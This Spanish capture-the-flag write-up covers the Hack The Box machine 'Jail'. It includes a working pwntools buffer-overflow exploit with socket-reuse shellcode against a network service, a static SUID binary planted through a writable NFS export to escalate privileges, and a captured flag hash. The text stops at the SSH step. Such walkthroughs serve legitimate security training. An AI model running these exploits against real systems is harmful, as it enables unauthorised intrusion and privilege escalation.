@@ -1,0 +1,967 @@
+---
+layout: post
+title: Jail
+date: 2023-02-29
+description:
+img:
+fig-caption:
+tags: [OSCP]
+---
+___
+
+<center><img src="/writeups/assets/img/Jail-htb/Jail.png" alt="" style="height: 394px; width:520px;"></center>
+
+***
+
+# Conocimientos
+
+* Análisis de código en c
+
+* Buffer Overflow - Socket Reuse (Nivel Medio)
+
+* Creación de monturas
+
+* Abuso de privilegio a nivel de sudoers
+
+* Reto criptográfico (Escalada de Privilegios)
+
+***
+
+# Reconocimiento
+
+## Escaneo de puertos con nmap
+
+### Descubrimiento de puertos abiertos
+
+```null
+nmap -p- --open --min-rate 5000 -n -Pn -sS 10.10.10.34 -oG openports
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 18:26 GMT
+Nmap scan report for 10.10.10.34
+Host is up (0.18s latency).
+Not shown: 65497 filtered tcp ports (no-response), 32 filtered tcp ports (host-prohibited)
+Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
+PORT      STATE SERVICE
+22/tcp    open  ssh
+80/tcp    open  http
+111/tcp   open  rpcbind
+2049/tcp  open  nfs
+7411/tcp  open  daqstream
+20048/tcp open  mountd
+
+Nmap done: 1 IP address (1 host up) scanned in 27.72 seconds
+```
+
+### Escaneo de versión y servicios de cada puerto
+
+```null
+nmap -sCV -p22,80,111,2049,7411,20048 10.10.10.34 -oN portscan
+Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-01 18:28 GMT
+Nmap scan report for 10.10.10.34
+Host is up (0.22s latency).
+
+PORT      STATE SERVICE    VERSION
+22/tcp    open  ssh        OpenSSH 6.6.1 (protocol 2.0)
+| ssh-hostkey: 
+|   2048 cdec197cdadc16e2a39d42f3184be64d (RSA)
+|   256 af949f2f21d0e01dae8e7f1d7bd742ef (ECDSA)
+|_  256 6bf8dc274f1c8967a467c5ed0753af97 (ED25519)
+80/tcp    open  http       Apache httpd 2.4.6 ((CentOS))
+|_http-title: Site doesn't have a title (text/html; charset=UTF-8).
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.6 (CentOS)
+111/tcp   open  rpcbind    2-4 (RPC #100000)
+| rpcinfo: 
+|   program version    port/proto  service
+|   100000  2,3,4        111/tcp   rpcbind
+|   100000  2,3,4        111/udp   rpcbind
+|   100000  3,4          111/tcp6  rpcbind
+|   100000  3,4          111/udp6  rpcbind
+|   100003  3,4         2049/tcp   nfs
+|   100003  3,4         2049/tcp6  nfs
+|   100003  3,4         2049/udp   nfs
+|   100003  3,4         2049/udp6  nfs
+|   100005  1,2,3      20048/tcp   mountd
+|   100005  1,2,3      20048/tcp6  mountd
+|   100005  1,2,3      20048/udp   mountd
+|   100005  1,2,3      20048/udp6  mountd
+|   100021  1,3,4      32913/tcp6  nlockmgr
+|   100021  1,3,4      37177/udp6  nlockmgr
+|   100021  1,3,4      43985/tcp   nlockmgr
+|   100021  1,3,4      44755/udp   nlockmgr
+|   100024  1          40555/tcp6  status
+|   100024  1          45200/udp6  status
+|   100024  1          50949/udp   status
+|   100024  1          52782/tcp   status
+|   100227  3           2049/tcp   nfs_acl
+|   100227  3           2049/tcp6  nfs_acl
+|   100227  3           2049/udp   nfs_acl
+|_  100227  3           2049/udp6  nfs_acl
+2049/tcp  open  nfs_acl    3 (RPC #100227)
+7411/tcp  open  daqstream?
+| fingerprint-strings: 
+|   DNSStatusRequestTCP, DNSVersionBindReqTCP, FourOhFourRequest, GenericLines, GetRequest, HTTPOptions, Help, JavaRMI, Kerberos, LANDesk-RC, LDAPBindReq, LDAPSearchReq, LPDString, NCP, NULL, NotesRPC, RPCCheck, RTSPRequest, SIPOptions, SMBProgNeg, SSLSessionReq, TLSSessionReq, TerminalServer, TerminalServerCookie, WMSRequest, X11Probe, afp, giop, ms-sql-s, oracle-tns: 
+|_    OK Ready. Send USER command.
+20048/tcp open  mountd     1-3 (RPC #100005)
+1 service unrecognized despite returning data. If you know the service/version, please submit the following fingerprint at https://nmap.org/cgi-bin/submit.cgi?new-service :
+SF-Port7411-TCP:V=7.93%I=7%D=3/1%Time=63FF996E%P=x86_64-pc-linux-gnu%r(NUL
+SF:L,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(GenericLines,1D,
+SF:"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(GetRequest,1D,"OK\x20
+SF:Ready\.\x20Send\x20USER\x20command\.\n")%r(HTTPOptions,1D,"OK\x20Ready\
+SF:.\x20Send\x20USER\x20command\.\n")%r(RTSPRequest,1D,"OK\x20Ready\.\x20S
+SF:end\x20USER\x20command\.\n")%r(RPCCheck,1D,"OK\x20Ready\.\x20Send\x20US
+SF:ER\x20command\.\n")%r(DNSVersionBindReqTCP,1D,"OK\x20Ready\.\x20Send\x2
+SF:0USER\x20command\.\n")%r(DNSStatusRequestTCP,1D,"OK\x20Ready\.\x20Send\
+SF:x20USER\x20command\.\n")%r(Help,1D,"OK\x20Ready\.\x20Send\x20USER\x20co
+SF:mmand\.\n")%r(SSLSessionReq,1D,"OK\x20Ready\.\x20Send\x20USER\x20comman
+SF:d\.\n")%r(TerminalServerCookie,1D,"OK\x20Ready\.\x20Send\x20USER\x20com
+SF:mand\.\n")%r(TLSSessionReq,1D,"OK\x20Ready\.\x20Send\x20USER\x20command
+SF:\.\n")%r(Kerberos,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(
+SF:SMBProgNeg,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(X11Prob
+SF:e,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(FourOhFourReques
+SF:t,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(LPDString,1D,"OK
+SF:\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(LDAPSearchReq,1D,"OK\x20
+SF:Ready\.\x20Send\x20USER\x20command\.\n")%r(LDAPBindReq,1D,"OK\x20Ready\
+SF:.\x20Send\x20USER\x20command\.\n")%r(SIPOptions,1D,"OK\x20Ready\.\x20Se
+SF:nd\x20USER\x20command\.\n")%r(LANDesk-RC,1D,"OK\x20Ready\.\x20Send\x20U
+SF:SER\x20command\.\n")%r(TerminalServer,1D,"OK\x20Ready\.\x20Send\x20USER
+SF:\x20command\.\n")%r(NCP,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\
+SF:n")%r(NotesRPC,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(Jav
+SF:aRMI,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(WMSRequest,1D
+SF:,"OK\x20Ready\.\x20Send\x20USER\x20command\.\n")%r(oracle-tns,1D,"OK\x2
+SF:0Ready\.\x20Send\x20USER\x20command\.\n")%r(ms-sql-s,1D,"OK\x20Ready\.\
+SF:x20Send\x20USER\x20command\.\n")%r(afp,1D,"OK\x20Ready\.\x20Send\x20USE
+SF:R\x20command\.\n")%r(giop,1D,"OK\x20Ready\.\x20Send\x20USER\x20command\
+SF:.\n");
+
+Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+Nmap done: 1 IP address (1 host up) scanned in 191.49 seconds
+```
+
+## Puerto 80 (HTTP)
+
+Con ```whatweb``` analizo las tecnologías que está empleando el servidor web
+
+```null
+whatweb http://10.10.10.34
+http://10.10.10.34 [200 OK] Apache[2.4.6], Country[RESERVED][ZZ], HTTPServer[CentOS][Apache/2.4.6 (CentOS)], IP[10.10.10.34]
+```
+
+La página principal se ve así:
+
+<img src="/writeups/assets/img/Jail-htb/1.png" alt="">
+
+Aplico fuzzing para descubrir rutas
+
+```null
+gobuster dir -u http://10.10.10.34/ -w /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 30 --add-slash
+===============================================================
+Gobuster v3.1.0
+by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
+===============================================================
+[+] Url:                     http://10.10.10.34/
+[+] Method:                  GET
+[+] Threads:                 30
+[+] Wordlist:                /usr/share/wordlists/SecLists/Discovery/Web-Content/directory-list-2.3-medium.txt
+[+] Negative Status codes:   404
+[+] User Agent:              gobuster/3.1.0
+[+] Add Slash:               true
+[+] Timeout:                 10s
+===============================================================
+2023/03/01 18:41:05 Starting gobuster in directory enumeration mode
+===============================================================
+/icons/               (Status: 200) [Size: 74199]
+/cgi-bin/             (Status: 403) [Size: 210]
+/jailuser/            (Status: 200) [Size: 886]  
+```
+
+El directorio ```/jailuser/``` contiene un script en c
+
+```null
+wget -r http://10.10.10.34/jailuser/dev/ &>/dev/null
+```
+
+Al ejecutarlo abre un socket
+
+```null
+ltrace ./jail
+__libc_start_main(0x8048c57, 1, 0xffa6c3e4, 0x8048e70 <unfinished ...>
+socket(2, 1, 0)                                                                                                                  = 3
+setsockopt(3, 1, 2, 0xffa6c1e8)                                                                                                  = 0
+memset(0xffa6c1fc, '\0', 16)                                                                                                     = 0xffa6c1fc
+htons(7411, 0, 16, 0xffa6c1e8)                                                                                                   = 0xf31c
+bind(3, 0xffa6c1fc, 16, 0xffa6c1e8)                                                                                              = 0
+listen(3, 200, 16, 0xffa6c1e8)                                                                                                   = 0
+accept(3, 0xffa6c1ec, 0xffa6c30c, 0xffa6c1e8
+```
+
+Como tengo el código fuente, no es necesario analizar las funciones desde el ```ghidra```
+
+Se están creando una serie de variables globales
+
+```null
+int debugmode;
+int handle(int sock);
+int auth(char *username, char *password);
+
+int auth(char *username, char *password) {
+    char userpass[16];
+    char *response;
+    if (debugmode == 1) {
+        printf("Debug: userpass buffer @ %p\n", userpass);
+        fflush(stdout);
+    }
+    if (strcmp(username, "admin") != 0) return 0;
+    strcpy(userpass, password);
+    if (strcmp(userpass, "1974jailbreak!") == 0) {
+        return 1;
+    } else {
+        printf("Incorrect username and/or password.\n");
+        return 0;
+    }
+    return 0;
+}
+```
+
+Una de ellas corresponde a la contraseña del usuario, con un tamaño de 16 bytes. Se leakean credenciales
+
+```null
+gef➤  r
+Starting program: /home/rubbx/Desktop/HTB/Machines/Jail-htb/dev/jail 
+[*] Failed to find objfile or not a valid file format: [Errno 2] No such file or directory: 'system-supplied DSO at 0xf7fc7000'
+[Thread debugging using libthread_db enabled]
+Using host libthread_db library "/lib/x86_64-linux-gnu/libthread_db.so.1".
+[Detaching after fork from child process 21981]
+```
+
+Para poder seguir al proceso hijo con GDB, es necesario retocar unos ajustes
+
+```null
+gef➤  set detach-on-fork off
+gef➤  set follow-fork-mode child
+```
+
+Ahora al ejecutar puedo ver los registros una vez se desborda el buffer
+
+```null
+nc 127.0.0.1 7411
+OK Ready. Send USER command.
+USER admin
+OK Send PASS command.
+PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+```
+
+```null
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0xf7e1cff4  →  0x0021cd8c
+$ecx   : 0xf7e1e9b8  →  0x00000000
+$edx   : 0x1       
+$esp   : 0xffffd020  →  "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x8048e70  →  <__libc_csu_init+0> push ebp
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x41414141 ("AAAA"?)
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd020│+0x0000: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"	← $esp
+0xffffd024│+0x0004: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd028│+0x0008: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd02c│+0x000c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd030│+0x0010: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd034│+0x0014: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd038│+0x0018: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+0xffffd03c│+0x001c: "AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x41414141
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "jail", stopped 0x41414141 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+El binario no cuenta con ninguna protección
+
+```null
+gef➤  checksec
+[+] checksec for '/home/rubbx/Desktop/HTB/Machines/Jail-htb/dev/jail'
+[*] .gef-2b72f5d0d9f0f218a91cd1ca5148e45923b950d5.py:L8764 'checksec' is deprecated and will be removed in a feature release. Use Elf(fname).checksec()
+Canary                        : ✘ 
+NX                            : ✘ 
+PIE                           : ✘ 
+Fortify                       : ✘ 
+RelRO                         : Partial
+```
+
+Genero un patrón para encontrar el offset
+
+```null
+gef➤  pattern create
+[+] Generating a pattern of 1024 bytes (n=4)
+aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaabzaacbaaccaacdaaceaacfaacgaachaaciaacjaackaaclaacmaacnaacoaacpaacqaacraacsaactaacuaacvaacwaacxaacyaaczaadbaadcaaddaadeaadfaadgaadhaadiaadjaadkaadlaadmaadnaadoaadpaadqaadraadsaadtaaduaadvaadwaadxaadyaadzaaebaaecaaedaaeeaaefaaegaaehaaeiaaejaaekaaelaaemaaenaaeoaaepaaeqaaeraaesaaetaaeuaaevaaewaaexaaeyaaezaafbaafcaafdaafeaaffaafgaafhaafiaafjaafkaaflaafmaafnaafoaafpaafqaafraafsaaftaafuaafvaafwaafxaafyaafzaagbaagcaagdaageaagfaaggaaghaagiaagjaagkaaglaagmaagnaagoaagpaagqaagraagsaagtaaguaagvaagwaagxaagyaagzaahbaahcaahdaaheaahfaahgaahhaahiaahjaahkaahlaahmaahnaahoaahpaahqaahraahsaahtaahuaahvaahwaahxaahyaahzaaibaaicaaidaaieaaifaaigaaihaaiiaaijaaikaailaaimaainaaioaaipaaiqaairaaisaaitaaiuaaivaaiwaaixaaiyaaizaajbaajcaajdaajeaajfaajgaajhaajiaajjaajkaajlaajmaajnaajoaajpaajqaajraajsaajtaajuaajvaajwaajxaajyaajzaakbaakcaakdaakeaakfaak
+[+] Saved as '$_gef0'
+```
+
+Y una vez enviado lo calculo
+
+```null
+gef➤  pattern offset $eip
+[+] Searching for '$eip'
+[+] Found at offset 28 (little-endian search) likely
+[+] Found at offset 25 (big-endian search) 
+```
+
+Mando un nuevo payload para ver donde se van los bytes sobrantes una vez sobrescrito el EIP
+
+```null
+python3 -c 'print("A"*28+"B"*4+"C"*300)' | xclip -sel clip
+```
+
+```null
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+[ Legend: Modified register | Code | Heap | Stack | String ]
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── registers ────
+$eax   : 0x0       
+$ebx   : 0xf7e1cff4  →  0x0021cd8c
+$ecx   : 0xf7e1e9b8  →  0x00000000
+$edx   : 0x1       
+$esp   : 0xffffd020  →  "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+$ebp   : 0x41414141 ("AAAA"?)
+$esi   : 0x8048e70  →  <__libc_csu_init+0> push ebp
+$edi   : 0xf7ffcb80  →  0x00000000
+$eip   : 0x42424242 ("BBBB"?)
+$eflags: [ZERO carry PARITY adjust sign trap INTERRUPT direction overflow RESUME virtualx86 identification]
+$cs: 0x23 $ss: 0x2b $ds: 0x2b $es: 0x2b $fs: 0x00 $gs: 0x63 
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── stack ────
+0xffffd020│+0x0000: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"	← $esp
+0xffffd024│+0x0004: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd028│+0x0008: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd02c│+0x000c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd030│+0x0010: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd034│+0x0014: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd038│+0x0018: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+0xffffd03c│+0x001c: "CCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCCC[...]"
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── code:x86:32 ────
+[!] Cannot disassemble from $PC
+[!] Cannot access memory at address 0x42424242
+─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── threads ────
+[#0] Id 1, Name: "jail", stopped 0x42424242 in ?? (), reason: SIGSEGV
+───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────── trace ────
+────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
+```
+
+Las "C" se almacenan al comienzo del ESP. Pero no están todas, por lo que quiero pensar que no tengo el suficiente espacio como para introducir un shellcode
+
+```null
+gef➤  x/100wx $esp
+0xffffd020:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd030:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd040:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd050:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd060:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd070:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd080:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd090:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd0a0:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd0b0:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd0c0:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd0d0:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd0e0:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd0f0:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd100:	0x696d6461	0x4343006e	0x43434343	0x43434343
+0xffffd110:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd120:	0x43434343	0x43434343	0x43434343	0x43434343
+0xffffd130:	0x43434343	0x43434343	0x43434343	0x64614343
+0xffffd140:	0x006e696d	0x00000000	0x00000000	0x00000000
+0xffffd150:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd160:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd170:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd180:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd190:	0x00000000	0x00000000	0x00000000	0x00000000
+0xffffd1a0:	0x00000000	0x00000000	0x00000000	0x00000000
+```
+
+Para poder matar el proceso cuando se quede colgado, creo un script de bash en un oneliner
+
+```null
+cat killer.sh
+
+#!/bin/bash
+
+kill -9 $(lsof -i:7411 | grep jail | head -n 1 | awk '{print $2}' | tr -d "\n")
+```
+
+Según el script en c, puedo agregarle un comando DEBUG
+
+```null
+else if (strncmp(token, "DEBUG", 5) == 0) {
+  if (debugmode == 0) {
+      debugmode = 1;
+      printf("OK DEBUG mode on.\n");
+      fflush(stdout);
+```
+
+```null
+nc 127.0.0.1 7411
+OK Ready. Send USER command.
+DEBUG
+OK DEBUG mode on.
+USER admin
+OK Send PASS command.
+PASS 1974jailbreak!
+Debug: userpass buffer @ 0xffffd000
+OK Authentication success. Send command.
+```
+
+Esta dirección que le leakea, corresponde a la contraseña que le he pasado
+
+```null
+rlwrap nc 127.0.0.1 7411
+OK Ready. Send USER command.
+DEBUG
+OK DEBUG mode on.
+USER admin
+OK Send PASS command.
+PASS AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+Debug: userpass buffer @ 0xffffd000
+```
+
+```null
+gef➤  x/s 0xffffd000
+0xffffd000:	'A' <repeats 140 times>
+```
+
+Está bastante cerca del ESP
+
+```null
+gef➤  i r
+eax            0x0                 0x0
+ecx            0xf7e1e9b8          0xf7e1e9b8
+edx            0x1                 0x1
+ebx            0xf7e1cff4          0xf7e1cff4
+esp            0xffffd020          0xffffd020
+ebp            0x41414141          0x41414141
+esi            0x8048e70           0x8048e70
+edi            0xf7ffcb80          0xf7ffcb80
+eip            0x41414141          0x41414141
+eflags         0x10246             [ PF ZF IF RF ]
+cs             0x23                0x23
+ss             0x2b                0x2b
+ds             0x2b                0x2b
+es             0x2b                0x2b
+fs             0x0                 0x0
+gs             0x63                0x63
+```
+
+Pero esta dirección corresponde a la mía en local. Para poder explotarlo en la máquina víctima tengo que usar la suya propia. Por tanto, a la dirección que tendrái que apuntar sería esta más 32 bytes, ya que son los bytes necesarios para llegar a EIP y 4 cuatro para sobrescribirlo
+
+```null
+nc 10.10.10.34 7411
+OK Ready. Send USER command.
+DEBUG     
+OK DEBUG mode on.
+USER admin
+OK Send PASS command.
+PASS 1974jailbreak!
+Debug: userpass buffer @ 0xffffd610
+OK Authentication success. Send command.
+```
+
+```null
+❯ python
+Python 3.11.2 (main, Feb 12 2023, 00:48:52) [GCC 12.2.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+>>> hex(0xffffd610 + 32)
+'0xffffd630'
+```
+
+Como no tengo suficiente espacio, tengo que reutilizar un socket para poder inyectar mi shellcode, que en sete caso va a ser uno muy compacto de exploit-db
+
+```null
+searchsploit re-use
+Exploits: No Results
+--------------------------------------------------------------------- ---------------------------------
+ Shellcode Title                                                     |  Path
+--------------------------------------------------------------------- ---------------------------------
+Linux/x86 - execve(/bin/sh) + Re-Use Of Strings In .rodata Shellcode | linux_x86/13358.c
+Linux/x86 - execve(/bin/sh) + Socket Re-Use Shellcode (50 bytes)     | linux_x86/34060.c
+--------------------------------------------------------------------- ---------------------------------
+```
+
+Desactivo el ASLR en mi equipo
+
+```null
+echo '0' > /proc/sys/kernel/randomize_va_space
+```
+
+Creo un script que automatize la tarea
+
+```null
+from pwn import *
+import sys, signal, socket
+
+def def_handler(sig, frame):
+    sys.exit(1)
+
+
+# Ctrl+C
+signal.signal(signal.SIGINT, def_handler)
+
+# Variables globales
+ip = "127.0.0.1"
+port = 7411
+
+offset = 28
+junk = b"A"*offset
+EIP = p32(0xffffd0b0+32)
+
+buf = b"\x6a\x02\x5b\x6a\x29\x58\xcd\x80\x48\x89\xc6"
+buf += b"\x31\xc9\x56\x5b\x6a\x3f\x58\xcd\x80\x41\x80"
+buf += b"\xf9\x03\x75\xf5\x6a\x0b\x58\x99\x52\x31\xf6"
+buf += b"\x56\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e"
+buf += b"\x89\xe3\x31\xc9\xcd\x80"
+
+payload = junk + EIP + buf
+
+def makeConnection():
+
+    try:
+        context(os='linux', arch='i386')
+        p = remote("127.0.0.1", 7411)
+        p.recvuntil(b"OK Ready. Send USER command.")
+        p.sendline(b"USER admin")
+        p.recvuntil(b"OK Send PASS command.")
+        p.sendline(b"PASS " + payload)
+        p.interactive()
+    except:
+        print("\nPuerto cerrado :(\n\n")
+
+
+if __name__ == '__main__':
+
+    makeConnection()
+```
+
+Al ejecutarlo obtengo una sesión interactiva
+
+```null
+python3 exploit.py
+[+] Opening connection to 127.0.0.1 on port 7411: Done
+[*] Switching to interactive mode
+
+$ whoami
+root
+```
+
+Ahora introduzco la IP y la dirección de la máquina víctima
+
+```null
+python3 exploit.py
+[+] Opening connection to 10.10.10.34 on port 7411: Done
+[*] Switching to interactive mode
+
+$ whoami
+nobody
+$ hostname -I
+10.10.10.34 
+```
+
+Hay reglas de firewall implementadas, por lo que no puedo enviarme una reverse shell
+
+Tengo un privilegio a nivel de sudoers
+
+```null
+$ sudo -l
+Matching Defaults entries for nobody on this host:
+    !visiblepw, always_set_home, env_reset, env_keep="COLORS DISPLAY HOSTNAME
+    HISTSIZE KDEDIR LS_COLORS", env_keep+="MAIL PS1 PS2 QTDIR USERNAME LANG
+    LC_ADDRESS LC_CTYPE", env_keep+="LC_COLLATE LC_IDENTIFICATION
+    LC_MEASUREMENT LC_MESSAGES", env_keep+="LC_MONETARY LC_NAME LC_NUMERIC
+    LC_PAPER LC_TELEPHONE", env_keep+="LC_TIME LC_ALL LANGUAGE LINGUAS
+    _XKB_CHARSET XAUTHORITY", secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin
+
+User nobody may run the following commands on this host:
+    (frank) NOPASSWD: /opt/logreader/logreader.sh
+```
+
+Al ejecutarlo devuelve el siguiente output:
+
+```null
+sudo -u frank /opt/logreader/logreader.sh
+checkproc[1498485001]: 138
+checkproc[1498485301]: 131
+checkproc[1498573202]: 133
+checkproc[1498573501]: 130
+checkproc[1498573801]: 133
+checkproc[1498606250]: 135
+checkproc[1498606501]: 132
+...
+```
+
+Pero es un rabbithole, no lleva a ningún sitio. El puerto 2049 está abierto
+
+```null
+2049/tcp  open  nfs_acl    3 (RPC #100227)
+```
+
+Así que puedo crear una montura para ver su contenido
+
+```null
+showmount -e 10.10.10.34
+Export list for 10.10.10.34:
+/opt          *
+/var/nfsshare *
+```
+
+```null
+mkdir Jail-opt
+mkdir Jail-var
+```
+
+```null
+mount -t nfs 10.10.10.34:/var Jail-var
+mount -t nfs 10.10.10.34:/opt Jail-opt
+```
+
+Para ver en cuales tengo permisos de lectura / escritura lo puedo hacer leyendo el ```/etc/exports```
+
+```null
+$ cat /etc/exports
+/var/nfsshare *(rw,sync,root_squash,no_all_squash)
+/opt *(rw,sync,root_squash,no_all_squash)
+```
+
+Estos directorios tienen como grupo asignado el GUID 1000
+
+```null
+ls -la
+drwxr-xr-x root root  4.0 KB Thu Mar  2 09:13:08 2023  .
+drwxr-xr-x root root  4.0 KB Thu Mar  2 12:26:44 2023  ..
+drwx-wx--x root rubbx   6 B  Tue Jul  4 03:33:56 2017  nfsshare
+```
+
+Coincide que ya tengo un usuario con este identificador, así que si me convierto en él puedo acceder sin restricciones
+
+```null
+cd nfsshare
+touch testing
+echo $?
+0
+```
+
+Pero en verdad lo está creando el usuario ```frank```, porque su GUID es el 1000 en la máquina víctima
+
+```null
+ls -l /var/nfsshare/testing
+-rw-r--r--. 1 frank frank 0 Mar  2 04:36 /var/nfsshare/testing
+```
+
+```null
+cat /etc/passwd | grep frank
+frank:x:1000:1000:frank:/home/frank:/bin/bash
+```
+
+Creo un script en ```c``` que se encargue de spawnear una bash como este usuario, asignandóle el permiso SUID
+
+```null
+#include <stdio.h>
+#include <stdlib.h>
+
+int main(void){
+
+  setreuid(1000, 1000);
+  system("/bin/sh");
+  return 0;
+}
+```
+
+```null
+gcc testing.c -o testing -static
+```
+
+```null
+gcc testing.c -o testing -static
+```
+
+```nulll
+chmod 4755 testing
+```
+
+Al ejecutar me convierto en ese usuario
+
+```null
+$ /var/nfsshare/testing
+$ whoami
+frank
+```
+
+Puedo ver la primera flag
+
+```null
+$ cat user.txt
+b2eef1732671db58de5682e79410b5ea
+```
+
+Gano acceso por SSH
+
+```null
